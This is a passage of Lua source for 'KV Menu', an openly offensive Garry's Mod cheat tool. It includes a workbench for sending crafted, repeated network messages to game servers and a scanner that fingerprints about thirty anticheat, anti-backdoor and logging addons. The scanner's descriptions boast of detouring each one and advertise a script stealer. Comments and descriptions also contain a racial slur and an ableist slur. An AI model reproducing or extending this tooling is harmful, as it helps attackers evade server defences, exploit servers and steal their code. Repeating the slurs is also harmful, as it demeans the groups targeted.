        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local tttt = vgui.Create("DLabel", hostframe)
    tttt:SetPos(5, 5)
    tttt:SetText(btext)
    tttt:SizeToContents()
    local tentry = vgui.Create("DComboBox", hostframe)
    tentry:SetPos(10 + tttt:GetWide(), 2)
    tentry:SetSize(130, 20)
    tentry:SetSortItems(false)
    tentry:SetValue(istable(KV.GetStored(addr, default)) and tbl[KV.GetStored(addr, default)[1]] and tbl[KV.GetStored(addr, default)[1]][name] or "")

    for k, v in SortedPairsByMemberValue(tbl, sort) do
        if not restriction or v[restriction] then
            tentry:AddChoice(v[name], k)
        end
    end

    tentry.OnSelect = function(panel, index, value, data)
        tentry:SetValue(value)

        KV.Store(addr, {data, tbl[data][find] or data})
    end

    hostframe:SetSize(13 + tttt:GetWide() + tentry:GetWide(), 24)

    return hostframe:GetWide(), hostframe:GetTall()
end

function KV.MakeNumberInputButton(parent, x, y, btext, default, min, max, addr)
    if not parent:IsValid() then return end

    if min then
        min = KV.SafeToNumber(min)
    else
        min = -math.huge
    end

    if max then
        max = KV.SafeToNumber(max)
    else
        max = math.huge
    end

    local hostframe = vgui.Create("DPanel", parent)
    hostframe:SetPos(x, y)

    hostframe.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local tttt = vgui.Create("DLabel", hostframe)
    tttt:SetPos(5, 5)
    tttt:SetText(btext or "")
    tttt:SizeToContents()
    local numentry = vgui.Create("DNumberWang", hostframe)
    numentry:SetPos(10 + tttt:GetWide(), 2)
    numentry:SetSize(45, 20)
    numentry:SetDecimals(2)
    numentry:SetMin(min)
    numentry:SetMax(max)
    numentry:SetValue(KV.GetStored(addr, default))

    numentry.OnValueChanged = function(self, val)
        val = math.Clamp(KV.SafeToNumber(val), min, max)
        KV.Store(addr, val)
    end

    hostframe:SetSize(13 + tttt:GetWide() + numentry:GetWide(), 24)

    return hostframe:GetWide(), hostframe:GetTall()
end

function KV.MakeVectorInputButton(parent, x, y, btext, default, addr)
    if not parent:IsValid() then return end
    local hostframe = vgui.Create("DPanel", parent)
    hostframe:SetPos(x, y)

    hostframe.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local tttt = vgui.Create("DLabel", hostframe)
    tttt:SetPos(5, 5)
    tttt:SetText(btext or "")
    tttt:SizeToContents()
    local numentry = nil

    for i = 1, 3 do
        local numentry = vgui.Create("DNumberWang", hostframe)
        numentry:SetPos(3 * i + tttt:GetWide(), 2)
        numentry:SetSize(15 * i, 20)
        numentry:SetDecimals(2)
        numentry:SetValue(KV.GetStored(addr, default)[i])

        numentry.OnValueChanged = function(self, val)
            val = KV.SafeToNumber(val)
            local var = KV.GetStored(addr, default)
            self:SetValue(val)
            var[i] = val
            KV.Store(addr, var)
        end
    end

    hostframe:SetSize(13 + tttt:GetWide() + numentry:GetWide() * 3, 24)

    return hostframe:GetWide(), hostframe:GetTall()
end

--//////////////////////////////////////////- NET WORKBENCH -//////////////////////////////////////////////////
function KV.MakeMessageSelector(hostpanel, typevar, isent)
    local hostframe = vgui.Create("DPanel", KV.NetWorkbench.NetPanel)
    hostframe:SetPos(5, KV.NetWorkbench.NetPanel.ysize)
    hostframe:SetSize(KV.NetWorkbench.NetPanel:GetWide() - 10, 22)

    hostframe.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local tttt = vgui.Create("DLabel", hostframe)
    tttt:SetPos(20, 4)
    tttt.Type = typevar
    tttt:SetText(typevar)
    tttt:SizeToContents()
    local tentry = isent and vgui.Create("DComboBox", hostframe) or vgui.Create("DTextEntry", hostframe)
    tentry:SetSize(140, 18)
    tentry:SetPos(hostframe:GetWide() - 145, 2)

    if not isent then
        tentry:SetText("")

        tentry.OnChange = function(self)
            print(self:GetValue())
        end
    else
        for k, v in ipairs(player.GetAll()) do
            if (v:IsScripted() or v:IsPlayer()) and not string.StartWith(v:GetClass(), "env_") then
                tentry:AddChoice(tostring(v))
            end
        end

        DComboBox.OnSelect = function(panel, index, value)
            print(tostring(Entity(index)) .. " was selected!")
        end
    end

    local SelButton = vgui.Create("DButton", hostframe)
    SelButton:SetPos(5, 3)
    SelButton:SetText("")
    SelButton:SetTextColor(Color(255, 255, 255, 255))
    SelButton:SetSize(12, 16)

    SelButton.Paint = function(self, w, h)
        surface.SetDrawColor(Color(30, 30, 30, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(90, 90, 90, 200))
        surface.DrawRect(2, 2, 3, h - 4)
        surface.DrawRect(6, 2, 3, h - 4)
    end

    KV.NetWorkbench.NetPanel.ysize = KV.NetWorkbench.NetPanel.ysize + 25
    hostpanel:SetPos(5, KV.NetWorkbench.NetPanel.ysize)

    SelButton.DoClick = function(self)
        hostframe:Remove()
        KV.NetWorkbench.NetPanel.ysize = KV.NetWorkbench.NetPanel.ysize - 25
        hostpanel:SetPos(5, KV.NetWorkbench.NetPanel.ysize)
    end
end

function KV.NetmessagePanel()
    if KV.NetWorkbench and KV.NetWorkbench:IsVisible() then
        KV.NetWorkbench:Remove()
    end

    KV.NetWorkbench = vgui.Create("DFrame", KV.Menu)
    KV.NetWorkbench:SetSize(250, 400)
    KV.NetWorkbench:SetTitle("Send a netmessage")
    --    KV.NetWorkbench:SetPos( gui.MouseX(), gui.MouseY() )
    KV.NetWorkbench:MakePopup()
    KV.NetWorkbench:Center()

    KV.NetWorkbench.Paint = function(s, w, h)
        if not IsValid(KV.Menu) or not KV.Menu:IsVisible() then
            s:Remove()

            return
        end

        surface.SetDrawColor(Color(30, 30, 30, 255))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(55, 55, 55, 245))
        surface.DrawOutlinedRect(0, 0, w, h)
        surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        KV.DrawText("Channel: ", "KVMenuText", 5, 28, Color(255, 255, 255, 30))
        KV.DrawText("Repeat: ", "KVMenuText", 8, 54, Color(255, 255, 255, 30))
        KV.DrawText("Times", "KVMenuText", 100, 54, Color(255, 255, 255, 30))
        KV.DrawText("Delay: ", "KVMenuText", 15, 79, Color(255, 255, 255, 30))
        KV.DrawText("( 100 = 1 msg/second )", "KVMenuText", 100, 79, Color(255, 255, 255, 30))
        KV.DrawText("Data: ", "KVMenuText", 5, 104, Color(255, 255, 255, 30))
        surface.SetDrawColor(Color(0, 0, 0, 205))
        surface.DrawRect(5, 105, w - 10, 250)
    end

    KV.NetWorkbench.NetPanel = vgui.Create("DScrollPanel", KV.NetWorkbench)
    KV.NetWorkbench.NetPanel:SetSize(KV.NetWorkbench:GetWide() - 10, 250)
    KV.NetWorkbench.NetPanel:SetPos(5, 105)
    KV.NetWorkbench.NetPanel.ysize = 0
    local AddButton = vgui.Create("DButton", KV.NetWorkbench.NetPanel)
    AddButton:SetPos(5, KV.NetWorkbench.NetPanel.ysize)
    AddButton:SetText("Add New Data")
    AddButton:SetTextColor(Color(255, 255, 255, 255))
    AddButton:SetSize(KV.NetWorkbench.NetPanel:GetWide() - 10, 20)

    AddButton.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawRect(0, 0, w, 1)
        surface.DrawRect(0, 0, 1, h)
    end

    local DataToSend = {}

    AddButton.DoClick = function(self)
        local Menu = DermaMenu()

        local Menustr = Menu:AddOption("String (Text)", function()
            KV.MakeMessageSelector(self, "String")
        end)

        Menustr:SetIcon("icon16/script_edit.png")

        local Menuuint = Menu:AddOption("UInt (Positive Whole Number)", function()
            KV.MakeMessageSelector(self, "UInt")
        end)

        Menuuint:SetIcon("icon16/script_add.png")

        local Menuint = Menu:AddOption("Int (Whole Number)", function()
            KV.MakeMessageSelector(self, "Int")
        end)

        Menuint:SetIcon("icon16/script_delete.png")

        local Menufloat = Menu:AddOption("Float (Decimal Number)", function()
            KV.MakeMessageSelector(self, "Float")
        end)

        Menufloat:SetIcon("icon16/script_link.png")

        local Menubool = Menu:AddOption("Boolean (True or False)", function()
            KV.MakeMessageSelector(self, "Boolean")
        end)

        Menubool:SetIcon("icon16/script.png")

        local Menuvec = Menu:AddOption("Vector (3D coordinates)", function()
            KV.MakeMessageSelector(self, "Vector")
        end)

        Menuvec:SetIcon("icon16/script_code.png")

        local Menuang = Menu:AddOption("Angle (Pitch, Yaw and Roll)", function()
            KV.MakeMessageSelector(self, "Angle")
        end)

        Menuang:SetIcon("icon16/script_gear.png")

        local Menucol = Menu:AddOption("Colour (Red, Green and Blue)", function()
            KV.MakeMessageSelector(self, "Colour")
        end)

        Menucol:SetIcon("icon16/script_palette.png")

        local Menuent = Menu:AddOption("Player (Entity Object)", function()
            KV.MakeMessageSelector(self, "Player", true)
        end)

        Menuent:SetIcon("icon16/world.png")

        local Menudouble = Menu:AddOption("Double (High Precision Decimal Number)", function()
            KV.MakeMessageSelector(self, "Double")
        end)

        Menudouble:SetIcon("icon16/script_code_red.png")

        local Menudata = Menu:AddOption("Data (Binary Data + Length)", function()
            KV.MakeMessageSelector(self, "Data")
        end)

        Menudata:SetIcon("icon16/server.png")
        Menu:Open()
    end

    local netname = vgui.Create("DTextEntry", KV.NetWorkbench)
    netname:SetPos(50, 25)
    netname:SetSize(190, 20)
    netname:SetText(KV.GetStored("LCurrentNetmessage", ""))

    netname.OnChange = function(self)
        local nam = self:GetValue()
        KV.Store("LCurrentNetmessage", nam)
    end

    local netrepeat = vgui.Create("DNumberWang", KV.NetWorkbench)
    netrepeat:SetPos(50, 50)
    netrepeat:SetSize(45, 20)
    netrepeat:SetDecimals(2)
    netrepeat:SetValue(KV.GetStored("LCurrentNetRepeat", 1))

    netrepeat.OnValueChanged = function(self, val)
        KV.Store("LCurrentNetRepeat", self:GetValue())
    end

    local netdelay = vgui.Create("DNumberWang", KV.NetWorkbench)
    netdelay:SetPos(50, 75)
    netdelay:SetSize(45, 20)
    netdelay:SetDecimals(3)
    netdelay:SetValue(KV.GetStored("LCurrentnetDelay", 100))

    netdelay.OnValueChanged = function(self, val)
        KV.Store("LCurrentnetDelay", self:GetValue())
    end

    local netname = vgui.Create("DTextEntry", KV.NetWorkbench)
    netname:SetPos(50, 25)
    netname:SetSize(190, 20)
    netname:SetText(KV.GetStored("LCurrentNetmessage", ""))

    netname.OnChange = function(self)
        local nam = self:GetValue()
        KV.Store("LCurrentNetmessage", nam)
    end

    KV.NetWorkbench.SendToServerButton = vgui.Create("DButton", KV.NetWorkbench)
    KV.NetWorkbench.SendToServerButton:SetPos(5, KV.NetWorkbench:GetTall() - 35)
    KV.NetWorkbench.SendToServerButton:SetText("Send to Server")
    KV.NetWorkbench.SendToServerButton:SetTextColor(Color(255, 255, 255, 255))
    KV.NetWorkbench.SendToServerButton:SetSize(KV.NetWorkbench:GetWide() - 10, 30)

    KV.NetWorkbench.SendToServerButton.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    KV.NetWorkbench.SendToServerButton.DoClick = function() end
end

function KV.SecondsToClock(seconds)
    local seconds = KV.SafeToNumber(seconds)

    if seconds <= 0 then
        return "00:00:00"
    else
        local hours = string.format("%02.f", math.floor(seconds / 3600))
        local mins = string.format("%02.f", math.floor(seconds / 60 - (hours * 60)))
        local secs = string.format("%02.f", math.floor(seconds - hours * 3600 - mins * 60))

        return hours .. ":" .. mins .. ":" .. secs
    end
end

function KV.SafeToNumber(var)
    return tonumber(var) or -math.huge
end

function KV.GetWithinBounds(ent, entpos, dist)
    local tbl = {}

    if istable(ent) then
        for k, v in ipairs(ent) do
            if IsValid(v) then
                if v:GetPos():DistToSqr(entpos) < (dist * dist) then
                    tbl[#tbl + 1] = v
                end
            end
        end

        return tbl
    elseif IsValid(ent) and isfunction(ent.GetPos) then
        return ent:GetPos():DistToSqr(entpos:GetPos()) < (dist * dist)
    else
        return false
    end
end

function KV.SecureString(str)
    local tbl = string.ToTable(str)
    local final_tbl = table.Copy(tbl)

    for k, v in pairs(tbl) do
        table.insert(final_tbl, math.random(0, #tbl), "•")
    end

    return table.concat(tbl)
end

--[[
*   AntiCheat Detection
]]
local acfags = {
    ["BetterSNTE Anti-Exploit"] = {
        desc = "This was created shortly after SNTE became noticed to the pubic, This addon makes snte even \nmore useful but luckly for you are detour works on this addon (Don't scan backdoors)",
        scan = function()
            if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then return true end

            return false
        end
    },
    ["Cake Anti-Cheat (CAC)"] = {
        desc = "One of the best anticheats ever created on gmod still bans kids for cheating after it \nwas removed from gmodstore in 2017. Pity it it was never made to detect backdoors.",
        scan = function()
            if _G.CAC then return true end

            return false
        end
    },
    ["Quack Anti-Cheat (QAC)"] = {
        desc = "This addon is a joke even when it was released in 2014 it didn't detect anything. \nStill to this day i question if it was actually meant to ban people.",
        scan = function()
            if _G.QAC then return true end

            return false
        end
    },
    ["Simplac Anti-Cheat (SAC)"] = {
        desc = "This anticheat became popular for less than a week then get detoured shortly after not only that this anticheat had an exploit to crash servers \nwhat a mess for simplac lol.",
        scan = function()
            if _G.simplicity then return true end

            return false
        end
    },
    ["Cardinal Anti-Cheat"] = {
        desc = "This anticheat works like a screengrab and it's detections won't detect anything including something like kone bypass or some other shit 2014 dll bypass. I also \nlike how this was made somewhere around 2018 but surely you can make something better than that.",
        scan = function()
            if file.Exists("sh_cardinal.lua", "LUA") or file.Exists("client/cl_cardinal.lua", "LUA") then return true end

            return false
        end
    },
    ["CIB Anti-Exploit"] = {
        desc = "This anticheat mainly bans people for putting certain words in console such as 'smeghack' or some old menu that has been out \nfor ages however i don't think they have insert key in there keywords.",
        scan = function()
            if file.Exists("cib/sh_config_cib.lua", "LUA") or file.Exists("autorun/sh_start_cib.lua", "LUA") then return true end

            return false
        end
    },
    ["Nyaaa Anti-Exploit"] = {
        desc = "From my understanding this addon was created to prevent people from backdooring and i can tell that this isn't popular and never will be \ni am fairly certain that this addon doesn't even detect anything.",
        scan = function()
            if file.Exists("autorun/ab.lua", "LUA") or file.Exists("autorun/client/ab.lua", "LUA") then return true end

            return false
        end
    },
    ["Jenni Anti-Exploit"] = {
        desc = "This is a worse version of SNTE, It would make 1 net string appear to those cheaters that have it in their list except rebug doesn't have 'anti_exploits_ban' \nin its list so no ban for you :)",
        scan = function()
            if file.Exists("autorun/client/cl_anti_exploits.lua", "LUA") then return true end

            return false
        end
    },
    ["Telecomm Anti-Exploit"] = {
        desc = "This is a copy of the addon 'betterSnte' it uses the same functionality as that addon, To me \ni find this pointless to use on a gmod server let alone rename the addon.(Don't scan backdoors)",
        scan = function()
            if file.Exists("autorun/client/cl_antinexploits.lua", "LUA") then return true end

            return false
        end
    },
    ["SNTE Anti-Exploit"] = {
        desc = "This has been ruining skids for more than a year now. With our methods you can detour \nthis idiotic anti-cheat and not have a problem with it.",
        scan = function()
            if ConVarExists("snte_ulxluarun") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("autorun/!coresource_snte.lua", "LUA") or istable(global_nets) then return true end -- if BetterSNTE then makes present

            return false
        end
    },
    ["Modern Anti-Cheat"] = {
        desc = "This addon took ideas from snte and has a dhtml detection methods such as modules, \nLuckly for you WE are undetected from this shit.",
        scan = function()
            if file.Exists("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua", "LUA") or file.Exists("autorun/client/cl_mac.lua", "LUA") then return true end

            return false
        end
    },
    ["Swift Anti-Cheat"] = {
        desc = "This is the worst anticheat that i have ever seen i used kone bypass and it didn't ban me \nlet alone use a backdoor what a joke of an addon.",
        scan = function()
            if file.Exists("swiftac.lua", "LUA") then return true end

            return false
        end
    },
    ["Umbrella Anti-Exploit"] = {
        desc = "This was created by a bunch of retarded russians, you would have thought that they would have a brain for cheating \nin games but for gmod however they make something that is a copy of snte.",
        scan = function()
            if file.Exists("umbrella.lua", "LUA") then return true end

            return false
        end
    },
    ["Viper Anti-Exploit"] = {
        desc = "This is shit anticheat was uploaded to a leaking website by some russian, this addon is complete shit doesn't even detect anything \ndon't bother get scared of this shit if you somehow find it on a server.",
        scan = function()
            if file.Exists("cl_viperbdcheck.lua", "LUA") or file.Exists("sh_viperbdcheck.lua", "LUA") or file.Exists("autorun/cl_viper.lua", "LUA") then return true end

            return false
        end
    },
    ["Raptor Anti-Exploit"] = {
        desc = "This is a russian anticheat that is completly useless. It doesn't have anything inside that code that even detect kone bypass.\nDo not be feared by this addon.",
        scan = function()
            if file.Exists("autorun/client/cl_rac.lua", "LUA") then return true end

            return false
        end
    },
    ["C0nw0nk Anti-Cheat"] = {
        desc = "This isn't a popular anticheat it has low detection methods the only thing that can catch you is the bhop \nbut ill be suprised if that actually works.",
        scan = function()
            if file.Exists("autorun/send-lua-and-net-send.lua", "LUA") then return true end

            return false
        end
    },
    ["Prop Protection (SPC)"] = {
        desc = "GmodStore paid addon, This will prevent you from prop killing an`d prop climbing. \nThis will irritate you if you were planing on prop killing",
        scan = function()
            if file.Exists("autorun/smartsauce_loader.lua", "LUA") or file.Exists("autorun/smartsauce/sv_main.lua", "LUA") then return true end

            return false
        end
    },
    ["Spawn Protection (SZ)"] = {
        desc = "GmodStore paid spawn protection an addon that has been around for some time and is still \na popular addon to lots of people including me",
        scan = function()
            if file.Exists("sz_config.lua", "LUA") or file.Exists("autorun/autorun_safezones.lua", "LUA") then return true end

            return false
        end
    },
    ["Screengrab Anti-Cheat"] = {
        desc = "This is an addon that has been catching skids out for a while, most wonder how admins see \nthere shitty wall hacks except Kv-menu doesn't have any",
        scan = function()
            if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") then return true end

            return false
        end
    },
    ["BLogs Logging System"] = {
        desc = "One of the best logging systems added to gmod since release, it has lots of logging features \nincluding live feed which has been useful for lots of servers( Be careful )",
        scan = function()
            if file.Exists("gmodadminsuite/modules/logging/cl_menu.lua", "LUA") or file.Exists("vgui/gas_logging_advanced_search_item.lua", "LUA") then return true end

            return false
        end
    },
    ["Billys Admin Sits"] = {
        desc = "This addon is used for admins on servers to handle sits. It does however come with a \nscreengrab which we are not sure if it can see rebug so be careful",
        scan = function()
            if file.Exists("gmodadminsuite/modules/adminsits/sv_adminsits.lua", "LUA") or file.Exists("gmodadminsuite/modules/adminsits/sh_sit_behaviour.lua", "LUA") then return true end

            return false
        end
    },
    ["MLogs Logging System"] = {
        desc = "Quite a decent logging system i have been told, This addon logs lots of things im not sure \nthat it logs the same or more than blogs",
        scan = function()
            if file.Exists("mlib/lua/autorun/mlib.lua", "LUA") or file.Exists("mlogs2/lua/mlogs/config/cl_config", "LUA") then return true end

            return false
        end
    },
    ["PLogs Logging System"] = {
        desc = "Used to be a paid gmodstore addon BUT now is on github for lack of updates, This was a shit addon anyways \ndoesn't surprise me that its on github now lol.",
        scan = function()
            if file.Exists("plogs_cfg.lua", "LUA") or file.Exists("plogs_mysql_cfg.lua", "LUA") or file.Exists("autorun/plogs_init.lua", "LUA") then return true end

            return false
        end
    },
    ["AWarn2 Warning System"] = {
        desc = "Gmodstore addon that is still popular to this day, You will likely find this\n on any server you join tbh",
        scan = function()
            if file.Exists("autorun/sh_awarn.lua", "LUA") or file.Exists("autorun/sh_localization.lua", "LUA") or file.Exists("autorun/client/cl_awarn_newmenu.lua", "LUA") then return true end

            return false
        end
    },
    ["AWarn3 Warning System"] = {
        desc = "A recently made gmodstore addon and has became quiet popular with 300 downloads already,\n this will most likely start to be on most servers you join",
        scan = function()
            if file.Exists("autorun/awarn3.lua", "LUA") or file.Exists("includes/awarn3_blacklists.lua", "LUA") or file.Exists("includes/awarn3_permissions.lua", "LUA") then return true end

            return false
        end
    },
    ["LUA Stealer (Void)"] = {
        desc = "This is one of my creation, It is able to download the source code to your lua scripts from \nyou just pressing a button. This is a good addon yesss :)",
        scan = function()
            if file.Exists("autorun/sh_fuckthissheet.lua", "LUA") then return true end

            return false
        end
    },
    ["Sam admin"] = {
        desc = "This is an admin system \nidk why i added ",
        scan = function()
            if file.Exists("autorun/sam.lua", "LUA") then return true end ---DONT WORK VORT NIGGER----I fix

            return false
        end
    },
    ["Eprotect"] = {
        desc = "Shit ass aint expoilt mabye dont run lagspoilts tho.\nHuh i'm not banned? :)",
        scan = function()
            if file.Exists("autorun/eprotect_loader.lua", "LUA") then return true end ---DONT WORK VORT NIGGER----I fix

            return false
        end
    },
    ["Bsecure"] = {
        desc = "Very gud anti expoilt mabye dont run shit tho.\nHuh i'm not banned actually kinda suprised!",
        scan = function()
            if file.Exists("autorun/bsecure_include.lua", "LUA") then return true end ---DONT WORK VORT NIGGER----I fix

            return false
        end
    },
    ["Vectivus anti-backdoor"] = {
        desc = "Amazing anti-backdoor and also a an attempted anti-expoilt.\nYet with a simple detour it is not an anti-expoilt!\nJust use scan = function() return  file.Exists(filename, LUA) end add dont use stip expoilt since he tries to be cool and catch your ass out since if you run it boom become nigger..",
        scan = function()
            if file.Exists("autorun/sh_vectivus.lua", "LUA") then return true end ---DONT WORK VORT NIGGER----I fix

            return false
        end
    },
    ["Lords Suit Powers"] = {
        desc = "Loser Sever!!!!!.\nExpoilts coming soon!(cought esp)",
        scan = function()
            if file.Exists("autorun/lords_suit_autorun.lua", "LUA") then return true end ---DONT WORK VORT NIGGER----I fix

            return false
        end
    },
}

function anticheats()
    local acpanel = vgui.Create("DFrame")
    if not acpanel then return end
    acpanel:SetSize(500, 455)
    acpanel:SetTitle("Security measures for the server")
    acpanel:Center()
    acpanel:MakePopup()

    acpanel.Paint = function(s, w, h)
        surface.SetDrawColor(Color(30, 30, 30, 255))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(55, 55, 55, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
        surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        surface.SetDrawColor(Color(33, 33, 33, 200))
        surface.DrawRect(10, 25, w - 20, h - 35)
    end

    local Plist = vgui.Create("DPanelList", acpanel)
    Plist:SetSize(acpanel:GetWide() - 20, acpanel:GetTall() - 35)
    Plist:SetPadding(5)
    Plist:SetSpacing(5)
    Plist:EnableHorizontal(false)
    Plist:EnableVerticalScrollbar(true)
    Plist:SetPos(10, 25)
    Plist:SetName("")

    local function CreateACPanel(cmd)
        if not acpanel then return end
        local cmdp = vgui.Create("DPanel")
        cmdp:SetSize(Plist:GetWide(), 60)
        cmdp.Cmd = cmd
        cmdp.Desc = acfags[cmd].desc

        cmdp.Paint = function(s, w, h)
            surface.SetDrawColor(Color(50, 50, 50, 255))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(Color(65, 65, 65, 255))
            surface.DrawOutlinedRect(0, 0, w, h)
            surface.DrawLine(0, 24, w, 24)
            draw.DrawText(cmdp.Cmd, "DermaDefault", 10, 5, Color(255, 255, 255))
            draw.DrawText(cmdp.Desc, "DermaDefault", 10, 28, Color(205, 205, 255, 100))
        end

        Plist:AddItem(cmdp)
    end

    for k, v in pairs(acfags) do
        if v["scan"]() then
            CreateACPanel(k)
        end
    end
end

local anticheat = vgui.Create("DButton", KV.Menu)
anticheat:SetFont("Trebuchet18")
anticheat:SetText("AntiCheats")
anticheat:SetTextColor(Color(255, 255, 255, 255))
anticheat:SetPos(473, 591)
anticheat:SetSize(180, 40)
o_color2 = Color(255, 255, 255)

anticheat.Paint = function(self, w, h)
    surface.SetDrawColor(Color(30, 30, 30))
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(21, 21, 21)
    surface.SetMaterial(upgrad)
    surface.SetDrawColor(o_color2)
    surface.SetMaterial(downgrad)
    surface.SetDrawColor(o_color2)
    surface.SetDrawColor(21, 21, 21, 255)
    surface.DrawOutlinedRect(0, 0, w, h)
end

anticheat.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    anticheats()
    anticheat:SetVisible(false)
end

--//////////////////////////////////////////- MENU -//////////////////////////////////////////////////
local events = {
    ["player_disconnect"] = true,
    ["player_connect"] = true,
    ["player_hurt"] = true,
    ["player_say"] = true,
    ["player_activate"] = true,
    ["player_spawn"] = true,
    ["player_changename"] = true,
    ["player_info"] = true,
    ["server_cvar"] = true,
    ["break_prop"] = true,
    ["break_breakable"] = true,
    ["flare_ignite_npc"] = true,
    ["entity_killed"] = true,
}

local eventsR = {}

function KV.OpenMenu(bInit)
    if KV.Menu and KV.Menu:IsVisible() then return end
    KV.CreatePanel = function() end
    local ActiveCount = function() end
    local Plist = nil

    if bInit ~= true then
        KV.Menu = vgui.Create("DFrame")
        KV.Menu:SetSize(700, 550)
        KV.Menu:SetTitle("")
        KV.Menu:Center()
        KV.Menu:MakePopup()

        --[[
        ActiveCount = function()
            
            KV.Menu.ExploitCount = {KV.GetVarExploits("severity", KV.TYPEVARS.MORETHAN, 0)}
            
            KV.Menu.ExploitCount[2] = KV.GetVarTable(KV.Menu.ExploitCount[1], "scanned", KV.TYPEVARS.EQUALTO, true)
            KV.Menu.ExploitCount[3] = 0
            KV.Menu.ExploitCount[4] = 0
            
            for k, v in pairs(KV.Menu.ExploitCount[1]) do
                if(!v.count) then
                    v.count = {
                        ["Active"] = 1,
                        ["Total"] = 1,
                    }
                end

                if(istable(v.functions) && !v.count.Counted) then
                    for k2, v2 in pairs(v.functions) do
                        if(v2.typ == "bools") then
                            if(!v.count.Counted) then
                                v.count.Total = v.count.Total - 1
                                v.count.Counted = true
                            end
                            v.count.Total = v.count.Total + table.Count(v2.tbl)
                        end
                    end
                end

                KV.Menu.ExploitCount[3] = KV.Menu.ExploitCount[3] + v.count.Total
            end
            
            for k, v in pairs(KV.Menu.ExploitCount[2]) do
                KV.BlockNetOutgoing = true
                if(v.prevalidated) then KV.GENERAL_OVERRIDE = true end
                if(v.scan_always && !v.scan(v)) then KV.BlockNetOutgoing = false KV.GENERAL_OVERRIDE = false continue end
                KV.GENERAL_OVERRIDE = false
                KV.BlockNetOutgoing = false
                if(!v.count) then
                    v.count = {
                        ["Active"] = 1,
                        ["Total"] = 1,
                    }
                end

                KV.Menu.ExploitCount[4] = KV.Menu.ExploitCount[4] + v.count.Active
            end
            
        end
        ]]
        KV.Menu.Paint = function(s, w, h)
            draw.RoundedBox(10, 0, 0, w, h, Color(20, 20, 20))
            draw.RoundedBoxEx(5, 80, 25, w - 90, h - 25, Color(30, 30, 30), true, true, false, false)
            draw.SimpleText("KV Menu", "KVMenuTitle", 7, 2, Color(255, 255, 255))
            --draw.SimpleText( "Exploits: "..KV.Menu.ExploitCount[3], "KVMenuText", 7, 30, Color(255, 255, 255) )
            --draw.SimpleText( "Available: "..KV.Menu.ExploitCount[4], "KVMenuText", 7, 41, Color(255, 255, 255) )
            draw.SimpleText("Bait?: " .. KV.BAIT_COUNT, "KVMenuText", 7, 52, Color(255, 255, 255))
            draw.SimpleText(KV.DRAW_TPS .. "/" .. KV.TICK_RATE .. " - " .. KV.GetRateLimitedTimesPerTick(), "KVMenuText", 7, 64, Color(255, 255, 255))
        end

        Plist = vgui.Create("DPanelList", KV.Menu)
        Plist:SetSize(KV.Menu:GetWide() - 90, KV.Menu:GetTall() - 35)
        Plist:SetPadding(5)
        Plist:SetSpacing(5)
        Plist:EnableHorizontal(false)
        Plist:EnableVerticalScrollbar(false)
        Plist:SetPos(80, 25)
        Plist:SetName("")

        --KV.MakeFunctionButton( KV.Menu, 12, KV.Menu:GetTall() - 35, " net.Send ", KV.NetmessagePanel, "" )
        KV.CreatePanel = function(Name, t, parent)
            for _, tab in ipairs(t.functions) do
                if tab.typ == "bools" and istable(tab.tbl) then
                    if not t.count then
                        t.count = {
                            ["Active"] = 1,
                            ["Total"] = 1,
                        }
                    end

                    if not t.count.Counted then
                        if not t.count.Counted then
                            t.count.Total = t.count.Total - 1
                            t.count.Counted = true
                        end

                        t.count.Total = t.count.Total .. table.Count(tab.tbl)
                    end

                    local funcs = {}

                    for k, v in pairs(tab.tbl) do
                        if KV.ValidNetString(v) then
                            t.count.Active = t.count.Active + 1
                            local tab = table.Copy(tab)
                            tab.typ = "bool"

                            tab.ToggleText = {k}

                            tab.border = true
                            tab.bool = v
                            tab.channel = v
                            tab.tbl = nil
                            table.insert(t.functions, tab)
                            t.bools[v] = false
                        end
                    end

                    table.RemoveByValue(t.functions, tab)
                    t.typ = "bools"
                end
            end

            if #t.functions == 0 then return end
            local cmdp = vgui.Create("DPanel", parent)
            cmdp:SetSize(Plist:GetWide(), 75)
            cmdp.Cmd = Name
